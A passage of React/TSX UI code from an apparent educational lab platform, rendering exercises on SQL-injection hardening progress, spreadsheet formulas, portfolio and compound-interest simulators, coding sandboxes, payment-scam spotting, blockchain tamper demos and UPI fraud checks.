                    { label: '1. Architectural Prediction', done: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' },
                    { label: '2. Pipeline Hardened', done: secSimulationRan && secParamQueries && secOutputEncoding },
                    { label: '3. Diagnostic Code Fixed', done: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' },
                    { label: '4. Wire-Level AST Explanation', done: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' },
                  ].map((stage, i) => (
                    <div
                      key={i}
                      style={{
                        padding: '8px 12px',
                        borderRadius: '6px',
                        backgroundColor: stage.done ? 'rgba(22, 163, 74, 0.1)' : 'var(--bg-canvas)',
                        border: `1px solid ${stage.done ? 'var(--success)' : 'var(--border-subtle)'}`,
                        fontSize: '0.8rem',
                        fontWeight: 600,
                        color: stage.done ? 'var(--success)' : 'var(--text-secondary)',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '6px',
                      }}
                    >
                      <span>{stage.done ? '✓' : '○'}</span>
                      <span>{stage.label}</span>
                    </div>
                  ))}
                </div>

                {checkedCriteria.every(Boolean) && (
                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '10px' }}>
                    <div style={{ fontSize: '0.82rem', color: 'var(--success)', fontWeight: 600 }}>
                      All pedagogical requirements satisfied. Click &quot;Submit &amp; Verify Attempt&quot; in the header or below to record to Sovereign DB.
                    </div>
                    <button
                      type="button"
                      onClick={handleSubmitAttempt}
                      className="btn-primary"
                      style={{ height: '36px', padding: '0 18px' }}
                    >
                      <ShieldCheck size={16} />
                      <span>Submit &amp; Verify Attempt</span>
                    </button>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 6: MICROSOFT PRODUCTIVITY EXERCISE            */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t6-microsoft-productivity' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Quarterly Regional Sales Data Sheet
              </div>

              <div className="table-container">
                <table>
                  <thead>
                    <tr>
                      <th>Row</th>
                      <th>Region (Col A)</th>
                      <th>Quarter (Col B)</th>
                      <th>Revenue (Col C)</th>
                      <th>CAC (Col D)</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>2</td>
                      <td>North</td>
                      <td>Q1</td>
                      <td>$120,000</td>
                      <td>$450</td>
                    </tr>
                    <tr>
                      <td>3</td>
                      <td>South</td>
                      <td>Q2</td>
                      <td>$185,000</td>
                      <td>$520</td>
                    </tr>
                    <tr>
                      <td>4</td>
                      <td>East</td>
                      <td>Q3</td>
                      <td>$140,000</td>
                      <td>$480</td>
                    </tr>
                    <tr>
                      <td>5</td>
                      <td>West</td>
                      <td>Q4</td>
                      <td>$210,000</td>
                      <td>$430</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '16px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>
                    Enter formula for Total Revenue (Row 6):
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. =SUM(C2:C5)"
                    value={prodFormulaSum}
                    onChange={(e) => setProdFormulaSum(e.target.value)}
                    className="form-input"
                    style={{ fontFamily: 'var(--font-mono)' }}
                  />
                  {prodRevenueCorrect && (
                    <span style={{ fontSize: '0.78rem', color: 'var(--success)', fontWeight: 600 }}>
                      ✓ Correct: Result = $655,000
                    </span>
                  )}
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>
                    Enter formula for Average CAC (Row 7):
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. =AVERAGE(D2:D5)"
                    value={prodFormulaAvg}
                    onChange={(e) => setProdFormulaAvg(e.target.value)}
                    className="form-input"
                    style={{ fontFamily: 'var(--font-mono)' }}
                  />
                  {prodAvgCorrect && (
                    <span style={{ fontSize: '0.78rem', color: 'var(--success)', fontWeight: 600 }}>
                      ✓ Correct: Result = $470.00
                    </span>
                  )}
                </div>
              </div>

              <div style={{ padding: '12px 16px', borderRadius: '6px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
                  <input
                    type="checkbox"
                    checked={prodFormatted}
                    onChange={(e) => setProdFormatted(e.target.checked)}
                  />
                  <span style={{ fontWeight: 600 }}>Apply currency formatting ($) to output metrics</span>
                </label>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 7: FINANCIAL MARKET EXPLORER                  */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-f1-market-explorer' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Scenario Simulation & Portfolio Sensitivity
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Market Scenario</label>
                  <select
                    value={finScenario}
                    onChange={(e: any) => setFinScenario(e.target.value)}
                    className="form-input"
                  >
                    <option value="expansion">Steady Economic Expansion</option>
                    <option value="correction">Tech Sector Correction</option>
                    <option value="shock">Macroeconomic Liquidity Shock</option>
                  </select>
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600, display: 'flex', justifyContent: 'space-between' }}>
                    <span>Portfolio Beta (β)</span>
                    <span style={{ fontWeight: 700, color: 'var(--brand-primary)' }}>{finBeta}x</span>
                  </label>
                  <input
                    type="range"
                    min="0.5"
                    max="2.0"
                    step="0.1"
                    value={finBeta}
                    onChange={(e) => setFinBeta(Number(e.target.value))}
                    style={{ accentColor: 'var(--brand-primary)' }}
                  />
                </div>
              </div>

              {/* Real-time SVG Financial Market Trendline & Volatility */}
              <MarketTrendSvg scenario={finScenario} beta={finBeta} />

              {/* Metrics Output */}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '14px' }}>
                <div style={{ padding: '16px', borderRadius: '8px', backgroundColor: 'var(--bg-surface-subdued)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', fontWeight: 700 }}>ANNUALIZED RETURN</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: marketMetrics.returnPct >= 0 ? 'var(--success)' : 'var(--danger)' }}>
                    {marketMetrics.returnPct > 0 ? `+${marketMetrics.returnPct}%` : `${marketMetrics.returnPct}%`}
                  </div>
                </div>

                <div style={{ padding: '16px', borderRadius: '8px', backgroundColor: 'var(--bg-surface-subdued)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', fontWeight: 700 }}>MAX DRAWDOWN</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: 'var(--danger)' }}>
                    -{marketMetrics.maxDrawdown}%
                  </div>
                </div>

                <div style={{ padding: '16px', borderRadius: '8px', backgroundColor: 'var(--bg-surface-subdued)', border: '1px solid var(--border-subtle)', textAlign: 'center' }}>
                  <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', fontWeight: 700 }}>SHARPE RATIO</div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: marketMetrics.sharpeRatio > 1 ? 'var(--success)' : 'var(--text-primary)' }}>
                    {marketMetrics.sharpeRatio}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 8: COMPOUND INTEREST CALCULATOR               */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-f2-compound-interest' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Financial Compounding Engine: A = P(1 + r/n)^(nt)
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Initial Principal ($)</label>
                  <input
                    type="number"
                    value={compPrincipal}
                    onChange={(e) => setCompPrincipal(Number(e.target.value))}
                    className="form-input"
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Monthly Contribution ($)</label>
                  <input
                    type="number"
                    value={compMonthly}
                    onChange={(e) => setCompMonthly(Number(e.target.value))}
                    className="form-input"
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Annual Interest Rate (%)</label>
                  <input
                    type="number"
                    value={compRate}
                    onChange={(e) => setCompRate(Number(e.target.value))}
                    className="form-input"
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Time Horizon (Years)</label>
                  <input
                    type="number"
                    value={compYears}
                    onChange={(e) => setCompYears(Number(e.target.value))}
                    className="form-input"
                  />
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600 }}>Compounding Frequency</label>
                  <select
                    value={compFreq}
                    onChange={(e) => setCompFreq(Number(e.target.value))}
                    className="form-input"
                  >
                    <option value={12}>Monthly (12x/year)</option>
                    <option value={4}>Quarterly (4x/year)</option>
                    <option value={1}>Annually (1x/year)</option>
                  </select>
                </div>
              </div>

              {/* Real-time SVG Exponential Compounding Breakdown */}
              <CompoundGrowthSvg
                principal={compPrincipal}
                monthly={compMonthly}
                rate={compRate}
                years={compYears}
              />

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
                <div style={{ padding: '18px', borderRadius: '8px', backgroundColor: 'var(--brand-surface)', border: '1px solid var(--brand-border)' }}>
                  <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--brand-primary)' }}>PROJECTED FUTURE VALUE</div>
                  <div style={{ fontSize: '1.6rem', fontWeight: 800, color: 'var(--brand-primary)' }}>
                    ${compoundCalculation.totalFV.toLocaleString()}
                  </div>
                </div>

                <div style={{ padding: '18px', borderRadius: '8px', backgroundColor: 'var(--success-bg)', border: '1px solid var(--success-border)' }}>
                  <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--success)' }}>TOTAL INTEREST EARNED</div>
                  <div style={{ fontSize: '1.6rem', fontWeight: 800, color: 'var(--success)' }}>
                    ${compoundCalculation.totalInterest.toLocaleString()} ({compoundCalculation.interestRatio}% of total)
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 9: FINANCIAL INSTITUTION FLOW SIMULATOR       */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-f3-institution-flow' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                  Multi-Party Settlement Lifecycle
                </div>
                <button
                  type="button"
                  onClick={handleNextFlowStep}
                  className="btn-primary"
                  style={{ height: '36px', padding: '0 16px' }}
                >
                  <ChevronRight size={16} />
                  <span>Advance Stage ({flowStep}/5)</span>
                </button>
              </div>

              {/* Real-time SVG Settlement Pathway */}
              <SettlementLifecycleSvg currentStep={flowStep} />

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '8px', textAlign: 'center' }}>
                {['1. Gateway', '2. Card Network', '3. Issuing Bank', '4. Clearing House', '5. Merchant Bank'].map((title, i) => (
                  <div
                    key={i}
                    style={{
                      padding: '12px 8px',
                      borderRadius: '8px',
                      backgroundColor: flowStep > i ? 'var(--success-bg)' : flowStep === i ? 'var(--brand-surface)' : 'var(--bg-surface-subdued)',
                      border: flowStep > i ? '1px solid var(--success-border)' : flowStep === i ? '2px solid var(--brand-primary)' : '1px solid var(--border-subtle)',
                      fontWeight: 700,
                      fontSize: '0.78rem',
                      color: flowStep > i ? 'var(--success)' : flowStep === i ? 'var(--brand-primary)' : 'var(--text-muted)',
                    }}
                  >
                    {title}
                  </div>
                ))}
              </div>

              <div style={{ maxHeight: '160px', overflowY: 'auto', backgroundColor: 'var(--editor-bg)', border: '1px solid var(--border-subtle)', borderRadius: '6px', padding: '12px', fontFamily: 'var(--font-mono)', fontSize: '0.82rem', display: 'flex', flexDirection: 'column', gap: '6px' }}>
                {flowLogs.map((log, i) => (
                  <div key={i} style={{ color: 'var(--text-primary)' }}>{log}</div>
                ))}
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 10-12: CODING & PROGRAMMING SANDBOXES         */}
          {/* -------------------------------------------------------- */}
          {(lab.id === 'lab-c1-programming-fundamentals' ||
            lab.id === 'lab-c2-conditions-loops' ||
            lab.id === 'lab-c3-debugging-workshop') && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                  Isolated JavaScript Execution Runtime
                </div>
                <div style={{ display: 'flex', gap: '8px' }}>
                  {lab.id === 'lab-c3-debugging-workshop' && (
                    <button
                      type="button"
                      onClick={() => {
                        setHintsRevealed((prev) => Math.min(prev + 1, 2));
                        setShowHint(true);
                      }}
                      className="btn-secondary"
                      style={{ height: '32px', padding: '0 10px', fontSize: '0.78rem', gap: '4px' }}
                    >
                      <HelpCircle size={14} />
                      <span>{hintsRevealed === 0 ? 'Hint' : `Hint (${hintsRevealed}/2)`}</span>
                    </button>
                  )}
                  <button
                    type="button"
                    onClick={handleRunCode}
                    className="btn-primary"
                    style={{ height: '32px', padding: '0 14px', fontSize: '0.82rem', gap: '4px' }}
                  >
                    <Play size={14} />
                    <span>Run Code</span>
                  </button>
                </div>
              </div>

              {hintsRevealed > 0 && showHint && lab.id === 'lab-c3-debugging-workshop' && (
                <div style={{ padding: '10px 14px', borderRadius: '8px', backgroundColor: 'var(--warning-bg)', border: '1px solid var(--warning-border)', fontSize: '0.8rem', color: 'var(--warning-text)', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                  <div style={{ flex: 1 }}>
                    {hintsRevealed === 1 && (
                      <div><strong>Hint 1:</strong> Look at condition <code>left &lt; right</code>. What happens when search target is at index 0? Should it be <code>left &lt;= right</code>?</div>
                    )}
                    {hintsRevealed === 2 && (
                      <div><strong>Hint 2:</strong> In the <code>else</code> branch when <code>arr[mid] &gt; target</code>, make sure to adjust <code>right = mid - 1</code> to prevent infinite loops.</div>
                    )}
                  </div>
                  <button
                    type="button"
                    onClick={() => setShowHint(false)}
                    style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--warning-text)', padding: '2px', display: 'flex', alignItems: 'center' }}
                    title="Dismiss hint"
                  >
                    <X size={14} />
                  </button>
                </div>
              )}

              {/* Code Editor */}
              <div style={{ position: 'relative' }}>
                <textarea
                  value={codeContent}
                  onChange={(e) => {
                    setCodeContent(e.target.value);
                    setSaveStatus('LOCAL DRAFT');
                  }}
                  rows={14}
                  style={{
                    width: '100%',
                    padding: '14px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.88rem',
                    lineHeight: 1.5,
                    backgroundColor: 'var(--editor-bg)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '8px',
                    color: 'var(--text-primary)',
                    outline: 'none',
                    resize: 'vertical',
                  }}
                />
              </div>

              {/* Execution Output */}
              <div>
                <div style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-secondary)', marginBottom: '6px' }}>
                  Terminal Output (stdout)
                </div>
                <div
                  style={{
                    minHeight: '80px',
                    backgroundColor: 'var(--editor-bg)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '6px',
                    padding: '12px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.82rem',
                    color: codeTestsPassed ? 'var(--success)' : 'var(--text-primary)',
                    whiteSpace: 'pre-wrap',
                  }}
                >
                  {codeOutput || 'Click "Run Code" to inspect output.'}
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 13: DIGITAL PAYMENT SCAM DEFENSE SIMULATOR    */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-sec-scam-defense' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Cybercrime Defense: Educational Payment Scam Verification
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)', marginTop: '2px' }}>
                    NPCI & Indian Cyber Crime Coordination Centre (1930) Protocol
                  </div>
                </div>
                <div style={{ display: 'flex', gap: '6px' }}>
                  {scamCases.map((c, i) => (
                    <button
                      key={c.id}
                      type="button"
                      onClick={() => {
                        setScamCaseIndex(i);
                        setScamFeedback('');
                      }}
                      style={{
                        padding: '4px 10px',
                        borderRadius: '6px',
                        fontSize: '0.78rem',
                        fontWeight: 700,
                        backgroundColor: scamCaseIndex === i ? 'var(--brand-primary)' : 'var(--bg-canvas)',
                        color: scamCaseIndex === i ? '#FFFFFF' : 'var(--text-secondary)',
                        border: '1px solid var(--border-subtle)',
                        cursor: 'pointer',
                      }}
                    >
                      Case {i + 1}
                    </button>
                  ))}
                </div>
              </div>

              {/* Case inspection card */}
              <div
                style={{
                  padding: '20px',
                  borderRadius: '12px',
                  backgroundColor: 'var(--bg-surface)',
                  border: '1px solid var(--border-subtle)',
                  boxShadow: '0 2px 8px rgba(0, 0, 0, 0.04)',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
                  <AlertTriangle size={18} color="var(--warning)" />
                  <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                    {scamCases[scamCaseIndex].title}
                  </span>
                </div>
                <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginBottom: '12px', fontFamily: 'var(--font-mono)' }}>
                  Source: {scamCases[scamCaseIndex].sender}
                </div>
                <div
                  style={{
                    padding: '14px',
                    borderRadius: '8px',
                    backgroundColor: 'var(--bg-canvas)',
                    border: '1px solid var(--border-subtle)',
                    fontSize: '0.88rem',
                    color: 'var(--text-primary)',
                    lineHeight: 1.5,
                    marginBottom: '16px',
                  }}
                >
                  "{scamCases[scamCaseIndex].message}"
                </div>

                {/* Classification buttons */}
                <div style={{ display: 'flex', gap: '12px', flexWrap: 'wrap' }}>
                  <button
                    type="button"
                    onClick={() => handleEvaluateScam(scamCaseIndex, true)}
                    className="btn-outline"
                    style={{
                      flex: 1,
                      minWidth: '140px',
                      height: '38px',
                      borderColor: scamAnswers[scamCaseIndex]?.isFraud === true ? 'var(--danger)' : undefined,
                      backgroundColor: scamAnswers[scamCaseIndex]?.isFraud === true ? 'var(--danger-bg)' : undefined,
                      color: scamAnswers[scamCaseIndex]?.isFraud === true ? 'var(--danger)' : undefined,
                      fontWeight: 700,
                    }}
                  >
                    Flag as Potential Fraud / Scam
                  </button>
                  <button
                    type="button"
                    onClick={() => handleEvaluateScam(scamCaseIndex, false)}
                    className="btn-outline"
                    style={{
                      flex: 1,
                      minWidth: '140px',
                      height: '38px',
                      borderColor: scamAnswers[scamCaseIndex]?.isFraud === false ? 'var(--success)' : undefined,
                      backgroundColor: scamAnswers[scamCaseIndex]?.isFraud === false ? 'var(--success-bg)' : undefined,
                      color: scamAnswers[scamCaseIndex]?.isFraud === false ? 'var(--success)' : undefined,
                      fontWeight: 700,
                    }}
                  >
                    Mark as Legitimate Transaction
                  </button>
                </div>

                {scamFeedback && (
                  <div
                    style={{
                      marginTop: '16px',
                      padding: '12px 16px',
                      borderRadius: '8px',
                      backgroundColor: scamAnswers[scamCaseIndex]?.isFraud === scamCases[scamCaseIndex].isFraud ? 'var(--success-bg)' : 'var(--danger-bg)',
                      border: `1px solid ${scamAnswers[scamCaseIndex]?.isFraud === scamCases[scamCaseIndex].isFraud ? 'var(--success-border)' : 'var(--danger-border)'}`,
                      fontSize: '0.84rem',
                      lineHeight: 1.5,
                      color: 'var(--text-primary)',
                    }}
                  >
                    <div style={{ fontWeight: 700, marginBottom: '4px' }}>
                      {scamAnswers[scamCaseIndex]?.isFraud === scamCases[scamCaseIndex].isFraud ? '✓ Correct Assessment' : '⚠ Analysis Guidance'}
                    </div>
                    {scamCases[scamCaseIndex].explanation}
                  </div>
                )}
              </div>
            </div>
          )}
          {/* -------------------------------------------------------- */}
          {/* LAB T7: TrustLink Blockchain Consensus Simulation        */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t7-trustlink-blockchain' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    TrustLink Decentralized Consensus & Cryptographic Integrity Engine
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    SHA-256 Hashing, Proof-of-Work Nonce Mining & Distributed Validator Consensus
                  </div>
                </div>
                <span className={`badge ${trustlinkTampered ? 'badge-danger' : 'badge-brand'}`}>
                  {trustlinkTampered ? 'CHAIN DESYNCHRONIZED' : 'CONSENSUS VERIFIED'}
                </span>
              </div>

              {/* Data Payload Input */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <label style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)' }}>
                  Block Transaction Payload (Mempool Data):
                </label>
                <input
                  type="text"
                  value={trustlinkPayload}
                  onChange={(e) => {
                    setTrustlinkPayload(e.target.value);
                    setTrustlinkTampered(true);
                  }}
                  className="input-field"
                  style={{ width: '100%', height: '38px', borderRadius: '8px' }}
                />
              </div>

              {/* Mining & Hash Display */}
              <div
                style={{
                  padding: '16px',
                  borderRadius: '12px',
                  backgroundColor: 'var(--bg-canvas)',
                  border: '1px solid var(--border-subtle)',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '12px',
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '8px' }}>
                  <div style={{ fontSize: '0.82rem', color: 'var(--text-muted)' }}>
                    Proof-of-Work Nonce: <strong style={{ color: 'var(--text-primary)' }}>{trustlinkNonce}</strong>
                  </div>
                  <div style={{ fontSize: '0.82rem', color: 'var(--text-muted)' }}>
                    Leading Zero Target: <strong style={{ color: 'var(--brand-primary)' }}>00 (2 Nibbles)</strong>
                  </div>
                </div>

                <div style={{ fontFamily: 'var(--font-mono)', fontSize: '0.84rem', wordBreak: 'break-all', padding: '10px', borderRadius: '6px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)', color: trustlinkTampered ? 'var(--danger)' : 'var(--brand-primary)' }}>
                  {trustlinkHash}
                </div>

                <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
                  <button
                    type="button"
                    onClick={handleTrustlinkMine}
                    disabled={trustlinkMining}
                    className="btn-primary"
                    style={{ height: '36px', padding: '0 16px', fontSize: '0.82rem' }}
                  >
                    <Zap size={14} />
                    <span>{trustlinkMining ? 'Mining Proof-of-Work...' : 'Mine Valid Block Hash'}</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleTrustlinkTamper}
                    className="btn-outline"
                    style={{ height: '36px', padding: '0 14px', fontSize: '0.82rem', borderColor: 'var(--danger)', color: 'var(--danger)' }}
                  >
                    <AlertTriangle size={14} />
                    <span>Simulate Tamper Attack</span>
                  </button>
                </div>
              </div>

              {/* Validator Node Mesh */}
              <div>
                <div style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '8px' }}>
                  Peer Validator Node Synchronization Status:
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '10px' }}>
                  {trustlinkNodes.map((node) => (
                    <div
                      key={node.id}
                      style={{
                        padding: '10px 12px',
                        borderRadius: '8px',
                        backgroundColor: 'var(--bg-surface)',
                        border: '1px solid var(--border-subtle)',
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '4px',
                      }}
                    >
                      <div style={{ fontSize: '0.78rem', fontWeight: 700, color: 'var(--text-primary)' }}>{node.id}</div>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>Height: {node.blockHeight}</span>
                        <span
                          style={{
                            fontSize: '0.7rem',
                            fontWeight: 800,
                            color: node.status === 'VALIDATED' ? 'var(--brand-primary)' : 'var(--danger)',
                          }}
                        >
                          {node.status}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB F4: FinTech Discovery Simulation                     */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-f4-fintech-discovery' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    FinTech Infrastructure: Multi-Party UPI Clearing & Algorithmic Portfolios
                  </div>
                  <div style={{ fontSize: '0.84rem', color: 'var(--text-secondary)' }}>
                    Simulate real-time payment protocol switches, fraud risk gates, and robo-advisory curves
                  </div>
                </div>
                <span className="badge badge-brand">NPCI PROTOCOL v2.8</span>
              </div>

              {/* UPI Stage Flow Simulator */}
              <div style={{ padding: '16px', borderRadius: '12px', backgroundColor: 'var(--bg-canvas)', border: '1px solid var(--border-subtle)' }}>
                <div style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '12px' }}>
                  End-to-End UPI Clearing Pipeline:
                </div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '8px', overflowX: 'auto', paddingBottom: '8px' }}>
                  {['Payer Device', 'PSP Application', 'NPCI Switch', 'Remitter Core Bank', 'Beneficiary Account'].map((stepName, sIdx) => {
                    const isStepActive = fintechUpiStep >= sIdx;
                    return (
                      <div
                        key={stepName}
                        style={{
                          flex: 1,
                          minWidth: '110px',
                          padding: '10px 8px',
                          borderRadius: '8px',
                          textAlign: 'center',
                          backgroundColor: isStepActive ? 'var(--brand-primary)' : 'var(--bg-surface)',
                          color: isStepActive ? '#FFFFFF' : 'var(--text-muted)',
                          border: '1px solid var(--border-subtle)',
                          transition: 'all 0.2s ease',
                        }}
                      >
                        <div style={{ fontSize: '0.7rem', fontWeight: 800, opacity: 0.8 }}>STEP {sIdx + 1}</div>
                        <div style={{ fontSize: '0.78rem', fontWeight: 700, marginTop: '2px' }}>{stepName}</div>
                      </div>
                    );
                  })}
                </div>

                <div style={{ marginTop: '14px', display: 'flex', gap: '10px' }}>
                  <button
                    type="button"
                    onClick={handleSimulateUpi}
                    disabled={fintechSimulating}
                    className="btn-primary"
                    style={{ height: '36px', padding: '0 16px', fontSize: '0.82rem' }}
                  >
                    <Play size={14} />
                    <span>{fintechSimulating ? 'Processing Transaction...' : 'Execute ₹1,500 P2P Payment'}</span>
                  </button>
                </div>
              </div>

              {/* Fraud Risk Detection Rules */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '14px' }}>
                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '0.84rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '6px' }}>
                    Device SIM Binding Lock
                  </div>
                  <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '10px' }}>
                    Validates cryptographic hardware token with telecom provider
                  </div>
                  <button
                    type="button"
                    onClick={() => setFintechSimBinding(!fintechSimBinding)}
                    className="btn-outline"
                    style={{ height: '30px', padding: '0 10px', fontSize: '0.76rem', borderColor: fintechSimBinding ? 'var(--brand-primary)' : 'var(--border-subtle)' }}
                  >
                    {fintechSimBinding ? '✓ Active Hardware Binding' : '⚠ Binding Disabled'}
                  </button>
                </div>

                <div style={{ padding: '14px', borderRadius: '10px', backgroundColor: 'var(--bg-surface)', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '0.84rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '6px' }}>
                    Geo-Velocity Anomaly Check
                  </div>
                  <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', marginBottom: '10px' }}>
                    Prevents concurrent transactions originating &gt;500km apart
                  </div>
                  <button
                    type="button"
